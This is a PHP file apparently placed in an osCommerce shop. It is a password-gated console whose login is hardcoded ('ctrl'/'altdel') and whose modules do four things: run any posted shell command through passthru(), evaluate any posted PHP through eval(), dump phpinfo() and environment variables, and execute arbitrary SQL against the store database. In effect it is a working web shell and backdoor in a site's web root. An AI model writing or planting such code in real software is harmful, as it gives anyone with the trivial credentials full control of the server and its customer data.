<?php
/*
$name="q";$pass="q";
if (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || $HTTP_SERVER_VARS['PHP_AUTH_USER']!=$name || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass){
 header("WWW-Authenticate: Basic realm=\"AdminAccess\"");
 header("HTTP/1.0 401 Unauthorized");
 exit("Access Denied");
}
*/
// CHANGE this
define('DOWN_FOR_MAINTENANCE', 'false');
include('includes/application_top.php');

if ( is_array($_POST) && is_array($HTTP_POST_VARS)) {

}

if ( !tep_session_is_registered('oscs_access') ) {
  if ( isset($_POST['usrid']) && $_POST['usrid']=='ctrl' &&
       isset($_POST['usrpass']) && $_POST['usrpass']=='altdel' ) {
    $oscs_access=1; tep_session_register('oscs_access');
    tep_redirect( str_replace(HTTP_SERVER,'',tep_href_link(basename($PHP_SELF))) );
  }else{
   echo '<style>BODY{background:#000;font-family: verdana;font-size: 12px; color:#FFF; }</style>
<body><div align="center">
<form method="post">
U <input type="text" name="usrid"><br>P <input type="password"  name="usrpass"><br><input type="submit">
</form>
</div></body>';
   die();
  }
}

if (!get_cfg_var('safe_mode')) {
  set_time_limit(0);
}

?>
<style>
.mod{ border: solid gray 1px; }
.shr{ height:450px;border: solid gray 1px;overflow:auto; background:black; color:lime;}
BODY{background:#DEAD0C;font-family: verdana;font-size: 12px; }
/*TABLE{font-family: verdana;font-size: 10px;}*/
TABLE.qr{ background-color: #111111; font-family: verdana;font-size: 10px;}
TABLE.qr TD{ background-color: #DDDDDD;}
TABLE.qr TH{ background-color: gray;}
form {display:inline;}
textarea {width:100%;}
#sql{width:100%;font:Courier 12px; font-weight:bold; color: #444444;}
</style>
<body>
<?php
$mod_chain = array();
$mod_chain[] = new mod_info;
$mod_chain[] = new mod_shell;
$mod_chain[] = new mod_php;
$mod_chain[] = new mod_easysql;
echo '<form method="post"><select name="mod">';
foreach($mod_chain as $mod_obj) echo '<option value="'.$mod_obj->name.'">'.$mod_obj->name;
echo '</select><input type=submit></form>';

$m_c = count($mod_chain);
for($i=0;$i<$m_c;$i++) $mod_chain[$i]->init();
for($i=0;$i<$m_c;$i++) $mod_chain[$i]->process();
for($i=0;$i<$m_c;$i++) $mod_chain[$i]->render();
for($i=0;$i<$m_c;$i++) $mod_chain[$i]->done();






/*
$test = array(
  array('id'=>0, 'text'=>''),
  array('id'=>1, 'text'=>'select version();'),
  array('id'=>2, 'text'=>'show variables;')
);
*/
//echo ctl_check_list('test',$test,'','style="width:200px;height:150px;overflow:auto;border:solid gray 1px;"');

function ctl_check_list($name,$items,$values,$params=''){
 $ret = '<div class="ctlChkList" '.$params.'>';
 foreach($items as $idx=>$data) {
  $ret .= tep_draw_checkbox_field($name.'[]', $data['id'], $checked = false).$data['text'].'<br>';
 }
 $ret .= '</div>';
 return $ret;
}

class mod_skel{
        var $name = 'skel';
        var $active = false;
        function _render_begin(){ return '<div id="'.$this->name.'" class="mod"><form method="post"><input type=hidden name="mod" value="'.$this->name.'">';}
        function _render_end(){ return '</form></div>'; }
        function _activate() { $this->active=true; }
        function init(){ if($_POST['mod']==$this->name) $this->_activate();}
        function render(){
                //if (!$this->active) return;
        }
        function process(){}
        function done(){}
}

class mod_shell extends mod_skel{
        var $name = 'shell';
        var $snip = '';
        function init(){
          parent::init();
          $this->_js();
          $this->snip = '<select onchange="copyCmd();" id="snip">
          <option value="0">
    <option value="1">cd '.dirname($_SERVER['SCRIPT_FILENAME']).' && tar -cpzf temp/backup_'.date('Ymd').'.tar.gz --exclude=backup*.gz .</option>
    <option value="2">cd '.dirname($_SERVER['SCRIPT_FILENAME']).' && find . -name &quot;*.php&quot; -print > temp/pack_files.txt && tar -cpzf temp/backup_'.date('Ymd').'_f.tar.gz -T temp/pack_files.txt</option>
    </select>';
  }
        function render(){
                if (!$this->active) return;
                global $_POST;
                echo $this->_render_begin();
                echo '<div class="shr" id="sout"><pre>';
                if ($_POST['shell_cmd']!='') passthru($_POST['shell_cmd']);
                echo '</pre></div><br>';
                echo tep_draw_input_field('shell_cmd',$_POST['shell_cmd'],'id="pr" style="width:100%;"').'<br><input type="submit">'.$this->snip;
                echo $this->_render_end();
        }
        function _js(){
?>
<script>
function copyCmd(){
  var snip = document.getElementById("snip");
  document.getElementById("pr").value = snip.options[snip.value].text;
}
</script>
<?php
  }
}
class mod_php extends mod_skel{
        var $name = 'php';
        function render(){
                if (!$this->active) return;
                $q = empty($_POST['code'])?'':$_POST['code'];
                if (get_magic_quotes_gpc()) $q = stripslashes($q);
                if ( isset($_POST['code']) && !empty($_POST['code']) ) {
                        echo '<pre>'.htmlspecialchars($q).'</pre><hr>';
                        echo '<pre>'.htmlspecialchars(eval($q)).'</pre><br>';
                }
                if ( isset($_POST['view_var']) && !empty($_POST['var']) ) {
                  $vars__ = preg_split('/[,|\s]/', $_POST['var'], -1, PREG_SPLIT_NO_EMPTY);
                  foreach( $vars__ as $vars_ ){
                    $vars_ = preg_replace('/^\$/', '', $vars_);
                    global $$vars_;
                    echo '<pre>'; var_dump($$vars_); echo '</pre>';
                  }
                }
                echo $this->_render_begin();
                echo '<textarea name="code" cols=80 rows=15>'.$q.'</textarea><br><input type="submit"><br>';
                echo tep_draw_input_field('var',$_POST['var']).'<input type="submit" name="view_var" value="var_dump">';
                echo $this->_render_end();
        }
}

class mod_info extends mod_skel{
        var $name = 'info';
        function render(){
                if (!$this->active) return;
                echo 'date(\'O\') is '.date('O').' | ';
                echo 'date(\'r\') is '.date('r').' | ';
                echo 'mktime to DATE_TIME_FORMAT is '.strftime(DATE_TIME_FORMAT, mktime()).' | ';
                $av = tep_db_fetch_array(tep_db_query('select now() as v'));
                echo 'mySQL now is '.$av['v'];
                echo '<hr>';
                $av = tep_db_fetch_array(tep_db_query('select version() as v'));
                echo 'MySQL v:'.$av['v'].'<br>';
                $loaded_ext = get_loaded_extensions();
                if ( in_array( 'suhosin', $loaded_ext ) ) {
                  echo '<b>Loaded ext</b>: '.implode(', ',$loaded_ext);
                  echo '<pre>'; var_dump($_SERVER); echo '</pre>';
                  echo '<pre>'; var_dump($_ENV); echo '</pre>';
                  echo '<pre>'; var_dump($_REQUEST); echo '</pre>';
                }else{
                  phpinfo();
                }
        }
}

class mod_easysql extends mod_skel{
        var $name = 'easysql';
        var $ctl_tables = '';
        var $arr_tables = '';
        function init(){
    parent::init();
    if ($this->active) {
      $this->_tables();
      $this->_js();
    }

  }
        function render(){
                if (!$this->active) return;
                global $_POST;
$q = $_POST['q'];
if (get_magic_quotes_gpc()) $q = stripslashes($q);

                echo $this->_render_begin();
                echo '<textarea cols=90 rows=7 name="q" id="sql">'.$q.'</textarea><br>';
                echo '<input type="submit">';
                echo $this->ctl_tables;
                echo '<input type=button value="^" onclick="addTable(\'\');"><input type=button value="*" onclick="addTable(\'*\');"><br>';
                echo 'Split '.tep_draw_checkbox_field('split',1,true).' Delim '.tep_draw_input_field('delim',';').'<br>';
                echo 'Auto limit '.tep_draw_checkbox_field('uselimit',1).' Output '.tep_draw_input_field('limit',100);
                echo $this->_render_end();
if ($q=='') return;
    $aq = array($q);
    if ( isset($_POST['split'] ) ) {
      $delim = (get_magic_quotes_gpc())?stripslashes($_POST['delim']):$_POST['delim'];
      $aq = preg_split('/'.$delim.'[\r|\n]/',$q."\n",-1,PREG_SPLIT_NO_EMPTY);
    }

foreach ($aq as $q) {
    $q = trim($q);
    if ( !tep_not_null($q) ) continue;
    echo '<hr><b>'.$q.'</b>';
    echo '<table border=0 cellpadding=1 cellspacing=1 class=qr>';
    $_r = tep_db_query( $q );
    //if ($q[0]=="s") {
      echo '[ #'.tep_db_num_rows( $_r ).']';
      if ( tep_db_num_rows( $_r )>0 ){
        $row=0;
        while ( $_arr = tep_db_fetch_array( $_r ) ) {
          if ($row==0) {echo '<tr><th onclick="addCol(this);">'; echo join('</th><th onclick="addCol(this);">', array_keys($_arr)); echo '</th></tr>';}
          $val_arr = array();
          $_arr = array_values($_arr);
          foreach($_arr as $val) {
            if (is_null($val)) {
              $val_arr[] = '<i>NULL</i>';
            }else{
              $val_arr[] = $val;
            }
          }
          echo '<tr><td>'; echo join('</td><td>',$val_arr); echo '</td></tr>';
          $row++;
          if ( isset($_POST['uselimit']) && $row>=$_POST['limit'] ) { echo '<font color="red">Limited</font>'; break;}
        }
      }
      echo '</table>';
}
        }
        function _tables(){
           $this->ctl_tables = '';
    $this->arr_tables = array();
    $all_tables = array();
    $tbl_r = tep_db_query( "show tables" );
    if ( tep_db_num_rows( $tbl_r )>0 ){
      while ( $tbl_data = tep_db_fetch_array( $tbl_r ) ) {
        $idx_ar = array_values($tbl_data);
        $tbl_arr[] = array ( 'id'=>$idx_ar[0], 'text' => $idx_ar[0] );
        $this->arr_tables[] = $idx_ar[0];
      };
      $this->ctl_tables = tep_draw_pull_down_menu( 'tables', $tbl_arr, $tables, 'id="tables"' );
    }
    unset ($tbl_arr);
  }
  function _js(){
?>
<script>
function addCol(cell){
  var sql = document.getElementById("sql");
  sql.value += " " + cell.innerHTML + " ";
}
function addTable(how){
  var sql = document.getElementById("sql");
  var tables = document.getElementById("tables");
  if (how=='*') {
    sql.value = "SELECT * FROM " + tables.value;
  }else{
    sql.value += tables.value + " ";
  }
}
</script>
<?php
  }
}

  //tabHeader.style.display = 'none';

?>
</body>
